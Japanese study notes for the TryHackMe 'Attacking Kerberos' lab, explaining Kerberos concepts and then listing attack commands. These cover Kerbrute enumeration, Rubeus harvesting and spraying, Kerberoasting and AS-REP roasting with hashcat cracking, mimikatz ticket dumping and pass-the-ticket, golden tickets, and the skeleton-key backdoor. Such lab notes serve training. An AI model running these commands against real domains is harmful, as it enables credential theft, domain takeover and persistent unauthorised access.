# Kerberos

https://tryhackme.com/room/attackingkerberos

## 基本

### 用語

- チケット付与チケット ( TGT ) - チケット保証チケットは、ドメインの特定のリソースに対するサービス チケットを TGS に要求するために使用される認証チケットです。
- キー配布センター (KDC) - キー配布センターは、認証サービスとチケット付与サービスで構成される TGT とサービス チケットを発行するサービスです。
- 認証サービス(AS) - 認証サービスは、ドメイン内の TGS が 他のマシンおよびサービス チケットへのアクセスを要求するために使用する TGT を発行します。
- チケット付与サービス (TGS) - チケット付与サービスは TGT を受け取り、ドメイン上のマシンにチケットを返します。
- サービス プリンシパル名 (SPN) - サービス プリンシパル名は、サービス インスタンスをドメイン サービス アカウントに関連付けるために付与される識別子です。Windows では、サービスにドメイン サービス アカウントが必要であるため、サービスには SPN を設定する必要があります。
- KDC 長期秘密鍵（KDC LT 鍵） - KDC 鍵は KRBTGT サービスアカウントに基づいています。TGT の暗号化と PAC への署名に使用されます。
- クライアント長期秘密キー（クライアント LT キー） - クライアントキーは、コンピューターまたはサービスアカウントに基づいて生成されます。暗号化されたタイムスタンプを確認し、セッションキーを暗号化するために使用されます。
- サービス長期秘密鍵（サービス LT 鍵） - サービス鍵はサービスアカウントに基づいており、サービスチケットのサービス部分を暗号化し、PAC に署名するために使用されます。
- セッションキー- TGT 発行時に KDC によって発行されます。ユーザーはサービスチケットを要求する際に、TGT と共にセッションキーを KDC に提供します。
- Privilege Attribute Certificate (PAC) - PAC にはユーザーの関連情報がすべて含まれており、 TGT とともに KDC に送信され、ターゲット LT キーと KDC LT キーによって署名されてユーザーを検証します。

### AS-REQ ステップ

1. クライアントは認証チケットまたはチケット許可チケット ( TGT ) を要求します。
2. キー配布センターはクライアントを検証し、暗号化された TGT を返します。
3. クライアントは、アクセスするサービスのサービス プリンシパル名 (SPN) とともに、 暗号化された TGT をチケット保証サーバー (TGS) に送信します。
4. キー配布センター (KDC) は、ユーザーの TGT を確認し、ユーザーがサービスにアクセスできることを確認してから、サービスの有効なセッション キーをクライアントに送信します。
5. クライアントはサービスを要求し、ユーザーがアクセスできることを証明するために有効なセッション キーを送信します。
6. サービスはアクセスを許可します

### 攻撃方法と必要条件

- Kerbrute 列挙 - ドメインアクセスは不要
- Pass the Ticket - ドメインへのユーザーとしてのアクセスが必要
- Kerberoasting - 必要なユーザーとしてアクセス
- AS-REP Roasting - 必要なユーザーとしてアクセス
- ゴールデンチケット - 完全なドメイン侵害（ドメイン管理者）が必要
- シルバーチケット - サービスハッシュが必要
- スケルトンキー - 完全なドメイン侵害（ドメイン管理者）が必要

## Kerbrute 列挙

https://github.com/ropnop/kerbrute/releases

Kerbrute 列挙は、KDC に UDP フレームを 1 つ送信するだけであるため、ログイン失敗のイベントをトリガーしない。

```sh
~/tools/kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Rubeus によるチケットの収集と総当たり攻撃

https://github.com/GhostPack/Rubeus

```ps
# 30秒毎にTGTを収集
Rubeus.exe harvest /interval:30
```

```ps
# パスワードスプレーでTGT取得。（ユーザー名は自動的に取得する）
Rubeus.exe brute /password:Password1 /noticket
```

どちらもファイル保存されたりしないので、手作業で保存する必要がある。

```ps
$b64 = Get-Clipboard | Out-String
$b64 = $b64 -replace "\s+", ""
[System.IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String($b64))
```

## Rubeus と Impacket による Kerberoasting

ケルベロースティングの目的は、サービスアカウントのパスワードを入手すること。  
強力なパスワードの場合、この攻撃は機能しない。  
もしサービスアカウントがドメイン管理者の場合、ゴールデンチケットを得たのと同じこと。  
防御的な観点でいえば、サービスアカウントをドメイン管理者にしてはならない。

### Rubeus

```ps
# kerberoastable なユーザーのハッシュを出力
Rubeus.exe kerberoast
```

hashcat でクラック。

```sh
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

### impacket

リモートで可

```sh
# kerberoastable なユーザーのハッシュを出力
python3 /home/kali/tools/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.194.124 -request
```

Rubeus 同様に hashcat でクラック。

## AS-REP Roasting

サービスアカウント以外のユーザーのハッシュも入手できることが利点。  
唯一の条件は、ユーザーが Kerberos 事前認証を無効化していること。

```ps
Rubeus.exe asreproast
```

`$krb5asrep$` の後に `23$` を挿入して、最初の行が `$krb5asrep$23$User.....` になるようにしてから、

```sh
hashcat -m 18200 hash.txt Pass.txt
```

impacket はユーザーリストを与える必要はあるが、リモートで実行できる。

```sh
python3 /home/kali/tools/impacket/examples/GetNPUsers.py -dc-ip 10.10.194.124 controller.local/ -usersfile users.txt
```

## Pass the ticket

Pass the ticket は、マシンの LSASS メモリから TGT をダンプして使用する。  
管理者権限でコマンドプロンプトを使用する必要がある。

```cmd
mimikatz # sekurlsa::tickets /export
```

すべての.kirbi チケットが現在のディレクトリにエクスポートされる。  
krbtgt の管理者チケットがあれば、任意のサービスに対して TGS を取得し、完全な支配が可能になる。

`[0;1fc740]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`

```cmd
mimikatz # kerberos::ptt <ticket-file>
```

キャッシュされたチケットをリスト

```cmd
klist
```

ちなみに、「Rubeus によるチケットの収集と総当たり攻撃」で収集したチケットもファイル保存すれば同じように使える。

その後の例

```sh
PsExec.exe \\dc.domain.local cmd.exe

wmic /node:dc.domain.local process call create "cmd.exe /c whoami > C:\Users\Public\out.txt"

Enter-PSSession -ComputerName dc.domain.local

dir \\dc.domain.local\c$
```

## mimikatz によるゴールデン/シルバーチケット攻撃

- シルバーチケットは対象のサービス限定
- ゴールデンチケットは全ての Kerberos サービスにアクセスできる
- シルバーチケットの方がステルス性は高いので、どちらが優れているということはない

NTLM ハッシュをダンプ。SID も出力される。/name を付けなければ全員出る。

```sh
mimikatz # lsadump::lsa /inject /name:krbtgt
```

ゴールデンチケット。NTLM ハッシュと SID を指定。

```sh
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<NTLM-hash> /id:500

mimikatz # misc::cmd
```

## Backdoor（スケルトンキー）

ドメインフォレストのメモリに埋め込まれることで、マスターパスワードを持つ任意のマシンへのアクセスを可能にする。  
スケルトンキーが埋め込まれると、ドメインコントローラはユーザーの NT ハッシュと スケルトンキーの NT ハッシュの両方を使用してタイムスタンプの復号化を試み、ドメインフォレストへのアクセスを許可する。

スケルトンキーは Kerberos RC4 暗号でのみ機能する。  
mimikatz スケルトンキーのデフォルトのハッシュは `60BA4FCADC466C7A033C178194C03DF6` で、パスワードは `mimikatz`。

```
misc::skeleton
```

スケルトンキーはメモリ内のみ存在するため、永続化はしない。

その後の例

```ps
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz

dir \\Desktop-1\c$ /user:Machine1 mimikatz
```
